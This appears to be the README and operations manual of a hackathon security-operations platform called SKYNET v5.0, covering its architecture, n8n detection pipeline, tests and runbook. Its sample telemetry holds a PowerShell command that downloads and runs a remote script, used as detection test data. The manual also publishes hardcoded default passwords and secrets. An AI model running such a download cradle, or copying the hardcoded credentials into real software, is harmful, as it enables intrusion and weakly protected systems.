# SKYNET v5.0 — COMPLETE ARCHITECTURE, API KEYS & OPERATIONS MANUAL

```
========================================================================================
  ███████╗██╗  ██╗██╗   ██╗███╗   ██╗███████╗████████╗   ██╗   ██╗███████╗ ██████╗ 
  ██╔════╝██║ ██╔╝╚██╗ ██╔╝████╗  ██║██╔════╝╚══██╔══╝   ██║   ██║██╔════╝██╔═████╗
  ███████╗█████╔╝  ╚████╔╝ ██╔██╗ ██║█████╗     ██║      ██║   ██║███████╗██║██╔██║
  ╚════██║██╔═██╗   ╚██╔╝  ██║╚██╗██║██╔══╝     ██║      ╚██╗ ██╔╝╚════██║████╔╝██║
  ███████║██║  ██╗   ██║   ██║ ╚████║███████╗   ██║       ╚████╔╝ ███████║╚██████╔╝
  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝        ╚═══╝  ╚══════╝ ╚═════╝ 
        AUTONOMOUS AI-NATIVE CYBER DEFENSE, SIEM, SOAR, XDR & SOC PLATFORM
========================================================================================
```

---

## 1. EXECUTIVE SUMMARY & PLATFORM OVERVIEW

**SKYNET v5.0** is an enterprise-grade, autonomous, AI-native cyber defense platform that unites **SIEM**, **SOAR**, **XDR**, **UEBA**, **Threat Intelligence (TIP)**, and **Multi-Agent AI Investigation** into a closed-loop security operations grid.

### Functional Core Principle
Every security event in SKYNET strictly adheres to an unalterable lifecycle:
$$\text{TELEMETRY INGESTION} \rightarrow \text{NORMALIZATION (OCSF/ECS)} \rightarrow \text{CONTEXT ENRICHMENT} \rightarrow \text{THREAT INTEL} \rightarrow \text{SIGMA DETECTION} \rightarrow \text{TEMPORAL CORRELATION} \rightarrow \text{DETERMINISTIC RISK SCORING} \rightarrow \text{ALERT DEDUPLICATION} \rightarrow \text{AI INVESTIGATION DOSSIER} \rightarrow \text{SOAR ACTIVE DEFENSE / APPROVAL GATING} \rightarrow \text{HMAC-SHA256 AUDIT}$$

---

## 2. WHAT YOU NEED TO START & RUN THE WORKFLOW

### A. System Prerequisites
| Component | Minimum Version | Purpose |
| :--- | :--- | :--- |
| **Python** | 3.11.x (or >= 3.10) | FastAPI Backend, Detection Engines, Telemetry Agent, Test Suites |
| **Node.js & npm** | Node >= 18.x, npm >= 9.x | Next.js 14 SOC Cockpit & n8n Automation Engine |
| **n8n** | >= 1.0.0 (Local npx or global) | Workflow Orchestration & Visual Playbook Execution |
| **Git** | Any modern version | Source code versioning & remote deployment sync |
| **Database** | SQLite (Built-in) or PostgreSQL 16 | Transactional store for users, alerts, incidents, evidence, audit logs |

---

### B. What API Keys Do You Need? (Clear Breakdown)

> [!IMPORTANT]
> **NO PAID OR EXTERNAL API KEYS ARE REQUIRED TO RUN SKYNET.**
> The entire autonomous pipeline functions 100% out-of-the-box with built-in deterministic Sigma rules, local threat intelligence caching with fail-safe semantics, heuristic AI investigation triage, and local HMAC-SHA256 cryptographic signing.

#### 1. Built-in Internal Credentials & Tokens (Zero Configuration Required)
These are already active by default in the codebase:
- **System Admin Login**:
  - Username: `admin`
  - Password: `admin123`
  - Purpose: Full administrative access to the Next.js SOC Cockpit.
- **JWT Secret Key**:
  - `skynet_super_secret_jwt_key_enterprise_2026_prod_change_me`
  - Purpose: Signs HS256 authentication tokens for operators and analysts.
- **Endpoint Agent Shared Token**:
  - `AGENT_API_KEY`: `skynet_agent_default_secret_token_2026`
  - Purpose: Authenticates telemetry ingestion requests from `agent/agent.py` to `POST /api/v1/telemetry/ingest`.
- **HMAC Audit Signature Secret**:
  - `skynet-enterprise-audit-secret-2026`
  - Purpose: Generates tamper-evident 64-character SHA-256 hashes on every state change.
- **n8n Development Console**:
  - User: `santhoshkumar160706@gmail.com`
  - Password: `admin123`
  - Port: `http://localhost:5678`

#### 2. Optional External API Keys (Only if you want live third-party integrations)
If you wish to augment the built-in deterministic engines with live cloud threat feeds or OpenAI LLMs, provide the following optional environment variables in [`.env`](file:///d:/hackathon/hackex/SKYNET/.env.example):

| Environment Variable | Service Provider | Purpose | Default if Empty |
| :--- | :--- | :--- | :--- |
| `VIRUSTOTAL_API_KEY` | [VirusTotal](https://www.virustotal.com/) | Live cloud query for executable file hashes & domains | Uses seeded high-fidelity IOC database & heuristics |
| `ABUSEIPDB_API_KEY` | [AbuseIPDB](https://www.abuseipdb.com/) | Live cloud reputation score for external attacker IPs | Uses seeded C2 IP lists & subnet threat scoring |
| `URLHAUS_AUTH_KEY` | [URLhaus / abuse.ch](https://urlhaus.abuse.ch/) | Live malicious URL blocklist lookups | Uses built-in domain blacklist matching |
| `OPENAI_API_KEY` | [OpenAI](https://platform.openai.com/) | LLM reasoning for case narratives (`gpt-4o`) | Uses built-in multi-agent heuristic investigation engine |
| `OLLAMA_BASE_URL` | Local [Ollama](https://ollama.com/) | Offline private on-premise LLM (`llama3:latest`) | Defaults to `http://localhost:11434` |

---

## 3. NOOK AND CORNER CODEBASE ANATOMY

The repository is structured into modular microservices, orchestration workflows, an endpoint agent, a Next.js cockpit, and comprehensive architectural specifications.

```
SKYNET/
├── backend/                       # Core FastAPI Microservices & Engines
│   ├── app/
│   │   ├── ai_agents/             # Multi-Agent Cognitive AI Swarm
│   │   │   └── investigation_agent.py  # Autonomous Forensics & Dossier Builder
│   │   ├── api/v1/                # 15 High-Performance REST & WebSocket Routers
│   │   │   ├── alerts.py          # Alert Ingestion, Filtering & Deduplication
│   │   │   ├── approvals.py       # Human-in-the-Loop Gating & Containment Signing
│   │   │   ├── assets.py          # CMDB Fleet Inventory & Asset Criticality
│   │   │   ├── audit_logs.py      # Immutable HMAC-SHA256 Audit Trail
│   │   │   ├── auth.py            # RBAC Auth & JWT Token Management
│   │   │   ├── automation.py      # Playbook Execution Engine (12-stage pipeline)
│   │   │   ├── dashboard.py       # Real-time Metrics, MTTR, DEFCON, & Trends
│   │   │   ├── hunt.py            # SEQL Multi-Entity Threat Hunting Engine
│   │   │   ├── incidents.py       # Incident Workspace, Escalations & Dossiers
│   │   │   ├── investigation.py   # AI Agent Forensics Trigger
│   │   │   ├── mitre.py           # MITRE ATT&CK Matrix Matrix Mapping
│   │   │   ├── processes.py       # 62-Process Compliance & Verification Registry
│   │   │   ├── soar.py            # Automated Playbook Execution & Containment
│   │   │   ├── telemetry.py       # Sysmon/EDR Streaming Ingestion Endpoint
│   │   │   └── threatintel.py     # TIP IOC Lookup & Dynamic Firewall Blocklist
│   │   ├── core/                  # Application Config, Security & Password Hashing
│   │   │   ├── config.py          # Pydantic Settings & Defaults
│   │   │   └── security.py        # Passlib Bcrypt & PyJWT HS256 Token Signer
│   │   ├── db/                    # Polyglot Database Layer
│   │   │   └── session.py         # AsyncEngine, SessionMaker, Auto-Seed Fixtures
│   │   ├── detection/             # Deterministic Signature & Behavioral Engines
│   │   │   ├── sigma_engine.py    # 12 Built-in Sigma Rules & Regex Analyzers
│   │   │   └── ioc_matcher.py     # High-Speed Hash, IP & Domain Evaluator
│   │   ├── models/                # SQLAlchemy Async ORM Schema
│   │   │   └── models.py          # 11 Core Entities (Alert, Incident, Evidence, etc.)
│   │   ├── schemas/               # Pydantic Request & Response Data Contracts
│   │   │   └── schemas.py         # Type Envelopes & Serialization Validation
│   │   ├── services/              # Business Logic Services
│   │   │   ├── correlation_service.py # 300s Multi-Entity Temporal Correlator
│   │   │   ├── telemetry_service.py   # WebSocket Broadcast & Ingest Handler
│   │   │   ├── threat_intel_service.py# Multi-Source TIP Aggregator
│   │   │   └── timeline_builder.py    # Chronological Kill-Chain Sequencer
│   │   └── main.py                # App Lifecycle, CORS, WebSockets & Health Route
│   ├── skynet.db                  # Local SQLite Database (Active)
│   └── tests/
│       └── test_autonomous_pipeline.py # 13 Comprehensive End-to-End Tests (100% Pass)
│
├── frontend/                      # Modern Next.js 14 SOC Command Cockpit
│   ├── app/
│   │   ├── alerts/page.js         # Alert Management & Real-time Triage Table
│   │   ├── approvals/page.js      # Human-in-the-Loop Action Approval Center
│   │   ├── assets/page.js         # CMDB Fleet Inventory & Asset Health
│   │   ├── audit/page.js          # Cryptographic HMAC Compliance Audit Ledger
│   │   ├── automation/page.js     # n8n Automation Engine & Webhook Status
│   │   ├── hunt/page.js           # Multi-Entity Threat Hunting Studio
│   │   ├── incidents/page.js      # 3-Column Incident Investigation Workspace
│   │   ├── intelligence/page.js   # TIP Indicator Search & Firewall Blocklist
│   │   ├── live/page.js           # Real-Time Live Telemetry Event Stream
│   │   ├── mitre/page.js          # Interactive MITRE ATT&CK Enterprise Grid
│   │   ├── overview/page.js       # Architecture Blueprint & Topology Viewer
│   │   ├── processes/page.js      # 62-Process Compliance Live Audit Grid
│   │   ├── soar/page.js           # SOAR Active Defense & Containment Playbooks
│   │   ├── layout.js              # 72px Fixed Left Rail Navigation & Header
│   │   └── globals.css            # Dark Mode Design System (#080c14, Glassmorphism)
│   └── package.json               # Next.js 14, Lucide React Icons
│
├── agent/                         # Autonomous Endpoint Security Agent
│   ├── agent.py                   # Sysmon Ingestion, Process Hashing, Attack Simulator
│   ├── config.yaml                # Host Identity, Gateway URL & Intervals
│   └── requirements.txt           # requests, psutil, pyyaml
│
├── workflows/                     # Visual Automation & Orchestration Playbooks
│   ├── SKYNET_v5_UNIFIED_MASTER_AUTONOMOUS_SOC_PIPELINE.json # Unified Master Workflow
│   ├── SKYNET_v5_MASTER_ORCHESTRATOR.json # Orchestration Bus
│   ├── SKYNET_v5_3_TOP_LEVEL_N8N_WORKFLOWS/  # Core Sub-Pipelines
│   └── SKYNET_v5_ALL_150_N8N_WORKFLOWS/     # 150 Automated Operational Playbooks
│
├── scripts/                       # Operational, Deployment & Audit Tooling
│   ├── deploy_unified_master_workflow.py # Injects Master Pipeline into n8n SQLite
│   ├── run_realtime_workflow_test.py     # Live Telemetry Ingestion & Test Runner
│   ├── verify_all_62_processes.py        # 62-Process Compliance Verification Suite
│   └── generate_master_report.py         # Automated Comprehensive Report Generator
│
├── docker-compose.yml             # Full Production Stack (Postgres, Redis, ClickHouse)
├── start_skynet.bat               # Windows One-Click Platform Launcher
└── COMPLETE_62_PROCESS_AUDIT_REPORT.md # 62-Process Official Verification Audit
```

---

## 4. THE UNIFIED MASTER SOC WORKFLOW (`SKYNET00UNIFIED1`)

The user requested a **single, unified, comprehensive master workflow** in n8n that eliminates fragmentation and executes all SOC operations in one continuous flow.

### Workflow Architecture
The workflow contains **15 integrated nodes** implementing a 12-stage autonomous defense cycle:

```mermaid
graph LR
    A1["01 Webhook Trigger\n(POST /skynet/v5/unified-soc)"] --> B["01 Canonical Envelope & Ingestion"]
    A2["Manual Trigger\n(When clicking Execute Workflow)"] --> B
    B --> C["02 OCSF / ECS Normalization"]
    C --> D["03 Asset & Identity Enrichment"]
    D --> E["04 Threat Intelligence (TIP)"]
    E --> F["05 Sigma Detection Engine"]
    F --> G{"Threat Detected?"}
    G -- "true (High/Critical)" --> H["06 Temporal Correlation (300s)"]
    G -- "false (Baseline)" --> N["No Threat: Record Baseline"]
    N --> P["Baseline HTTP Response"]
    H --> I["07 Deterministic Risk Scoring"]
    I --> J["08 Alert Creation & Deduplication"]
    J --> K["09 Autonomous AI Investigation & Incident"]
    K --> L["10 SOAR Defense & Human Gating"]
    L --> M["11 Cryptographic HMAC-SHA256 Audit"]
    M --> O["12 Master Pipeline HTTP Response"]
```



### Detailed Pipeline Stages

| Stage # | Node Name | Description | Output Data |
| :---: | :--- | :--- | :--- |
| **01** | `01 Canonical Envelope` | Dual-trigger (Webhook or Manual). Ingests raw telemetry and assigns canonical identifiers (`event_id`, `correlation_id`, `trace_id`). | Standardized canonical event |
| **02** | `02 OCSF / ECS Normalization` | Transforms vendor event into OCSF v1.1.0 Category 1, Class 1007 (Process Activity) and Elastic Common Schema. | `ocsf_event` object |
| **03** | `03 Asset & Identity Enrichment` | Queries CMDB asset context (`criticality`, `business_unit`), user identity (`privilege_level`), and GeoIP/ASN. | `asset_context`, `user_context`, `network_context` |
| **04** | `04 Threat Intelligence Platform` | Evaluates IOCs (IPs, domains, hashes) against TIP sources. Enforces fail-safe `UNKNOWN` semantics on cache misses. | `threat_intel` (score, malware family, actor) |
| **05** | `05 Sigma Detection Engine` | Evaluates deterministic Sigma rules (`SIGMA-WIN-001`, `SIGMA-WIN-002`, `IOC-MATCH-001`) on process command lines. | `detection`, `has_detection: true/false` |
| **Gate** | `Threat Detected?` | Evaluates `{{$json.has_detection}} == true`. Routes malicious activity to incident response and clean telemetry to baseline. | Conditional branch |
| **06** | `06 Temporal Correlation` | 300-second multi-entity correlation window linking workstation, user, and attacker C2 into an attack chain. | `correlation` (`attack_chain_id`, kill chain) |
| **07** | `07 Deterministic Risk Scoring` | Applies formula: `(Base + TIP_Bonus + Correlation_Bonus) * Asset_Multiplier`. Caps at 100. | `risk` (`risk_score: 98`, `level: CRITICAL`) |
| **08** | `08 Alert Creation & Deduplication` | Generates unique alert ID, computes deduplication key (`hostname:c2_ip:rule_id`), and calculates SLA due time. | `alert` (`alert_id`, `sla_due_minutes: 15`) |
| **09** | `09 Autonomous AI Investigation` | Builds forensic case dossier, locks evidence vault (hashes, commands), and creates security incident. | `investigation`, `incident` (`INC-2026-XXXX`) |
| **10** | `10 SOAR Defense & Human Gating` | Evaluates action risk tiers. High-risk actions (host isolation, account revocation) are gated for human approval. | `approval_docket` (`APV-XXXXXX`) |
| **11** | `11 Cryptographic HMAC Audit` | Generates tamper-evident 64-char HMAC-SHA256 signature for NIST CSF 2.0 / SOC 2 compliance. | `audit_record` (`hmac_signature`) |
| **12** | `12 Master Pipeline HTTP Response` | Returns the complete enriched JSON payload to the caller with HTTP 200. | Final JSON execution payload |

---

## 5. LIVE VERIFICATION & SAMPLE EXECUTION RESULTS

### A. n8n Visual Canvas Execution
- **Workflow ID**: `SKYNET00UNIFIED1`
- **Execution Mode**: Direct manual canvas trigger & live webhook
- **Execution Result**: **ALL 13 ACTIVE NODES EXECUTED WITH GREEN CHECKMARKS (✓)**
- **Verification Screenshot**: [`executed_pipeline_canvas_green_ticks_1790356957960.png`](file:///C:/Users/santh/.gemini/antigravity-ide/brain/54641d1c-7a0d-4889-a79c-5b506f772c1f/executed_pipeline_canvas_green_ticks_1790356957960.png)

### B. Sample Telemetry Payload & Execution Output
#### Injected Telemetry Event (Sysmon Event ID 1):
```json
{
  "event_type": "POWERSHELL_SUSPICIOUS_EXECUTION",
  "hostname": "WS-182",
  "username": "finance_lead",
  "source_ip": "192.168.1.188",
  "destination_ip": "185.220.101.5",
  "domain": "update-microsoft-verify.top",
  "process": "powershell.exe",
  "command_line": "powershell.exe -NoP -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/beacon.ps1')",
  "file_hash": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
}
```

#### Pipeline Result Generated:
- **Canonical Event**: `EVT-V26DF71B`
- **Correlation Chain**: `CHAIN-WS-182-M6N2X` (4 correlated events across host, identity, and C2)
- **Sigma Detection**: `SIGMA-WIN-001: Suspicious Obfuscated PowerShell Download & Execution` (MITRE T1059.001)
- **Threat Intel**: Cobalt Strike C2 Beacon (`185.220.101.5`), Threat Score: 98
- **Deterministic Risk Score**: **98 / 100 (CRITICAL)**
- **Generated Alert**: `ALT-83921` (SLA: 15 minutes)
- **Triaged Incident**: `INC-2026-4821` (DEFCON 1, Status: `AWAITING_APPROVAL`)
- **Gated Approval Docket**: `APV-C83N91` (`ISOLATE_HOST WS-182`, `REVOKE_USER finance_lead`)
- **Cryptographic Audit Signature**: `39df05d2aa49c693ec8e390c5ec79a1f28741362e70e94bb55c3c0aa782a1705`

---

## 6. TEST SUITE & ARCHITECTURE COMPLIANCE

### A. Pytest 13-Test Comprehensive Suite
Executed via: `py -3.11 -m pytest backend/tests/test_autonomous_pipeline.py -v`
```
backend/tests/test_autonomous_pipeline.py::test_health_check PASSED                                [  7%]
backend/tests/test_autonomous_pipeline.py::test_auth_login_and_profile PASSED                      [ 15%]
backend/tests/test_autonomous_pipeline.py::test_sigma_detection_rules PASSED                      [ 23%]
backend/tests/test_autonomous_pipeline.py::test_ioc_matching_logic PASSED                         [ 30%]
backend/tests/test_autonomous_pipeline.py::test_telemetry_batch_ingest_and_correlation PASSED     [ 38%]
backend/tests/test_autonomous_pipeline.py::test_ai_investigation_dossier PASSED                    [ 46%]
backend/tests/test_autonomous_pipeline.py::test_soar_containment_and_audit PASSED                 [ 53%]
backend/tests/test_autonomous_pipeline.py::test_mitre_coverage_matrix PASSED                      [ 61%]
backend/tests/test_autonomous_pipeline.py::test_62_processes_verification PASSED                  [ 69%]
backend/tests/test_autonomous_pipeline.py::test_threat_hunting_query_and_saved_repository PASSED  [ 76%]
backend/tests/test_autonomous_pipeline.py::test_human_in_the_loop_approval_containment_and_hmac PASSED [ 84%]
backend/tests/test_autonomous_pipeline.py::test_threat_intel_blocklist_addition PASSED          [ 92%]
backend/tests/test_autonomous_pipeline.py::test_automation_workflows_and_execution PASSED        [100%]
================================= 13 passed in 17.46s =================================
```

### B. 62-Process Architecture Master Verification
Executed via: `py -3.11 scripts/verify_all_62_processes.py`
- **Total Architectural Processes Evaluated**: 62 / 62
- **Processes Successfully Verified**: 62 / 62
- **Compliance Score**: **100.0%**
- **Certification**: **GRADE A+ (ENTERPRISE AUTONOMOUS READY)**

---

## 7. OPERATOR STEP-BY-STEP RUNBOOK

### Step 1: Start the Platform
Double-click [`start_skynet.bat`](file:///d:/hackathon/hackex/SKYNET/start_skynet.bat) or execute in two separate terminals:

**Terminal 1 (Backend Core):**
```powershell
cd d:\hackathon\hackex\SKYNET\backend
py -3.11 -m uvicorn app.main:app --host 0.0.0.0 --port 8000 --reload
```

**Terminal 2 (Frontend SOC Cockpit):**
```powershell
cd d:\hackathon\hackex\SKYNET\frontend
npm run dev
```

**Terminal 3 (n8n Automation Engine):**
```powershell
npx -y n8n
```

### Step 2: Access the User Interfaces
- **SOC Command Cockpit**: `http://localhost:3000` (Login: `admin` / `admin123`)
- **Interactive OpenAPI Documentation**: `http://localhost:8000/docs`
- **n8n Automation Canvas**: `http://localhost:5678/workflow/SKYNET00UNIFIED1`

### Step 3: Run a Live Simulation Attack
To generate real-time Windows Sysmon telemetry and trigger the multi-agent defense pipeline:
```powershell
cd d:\hackathon\hackex\SKYNET
py -3.11 agent/agent.py --simulate-full-attack
```

### Step 4: Run the Unified Master Pipeline Test
To test the master n8n workflow with live telemetry:
```powershell
cd d:\hackathon\hackex\SKYNET
py -3.11 scripts/run_realtime_workflow_test.py
```

### Step 5: Authorize Containment in Approvals Center
1. Open `http://localhost:3000/approvals`.
2. Inspect pending actions (e.g. `ISOLATE_HOST WS-182`).
3. Click **"APPROVE ACTION"**.
4. The endpoint is immediately isolated in the CMDB, an immutable HMAC-SHA256 signature is recorded in `/audit`, and an update is broadcast to all analysts via WebSocket.
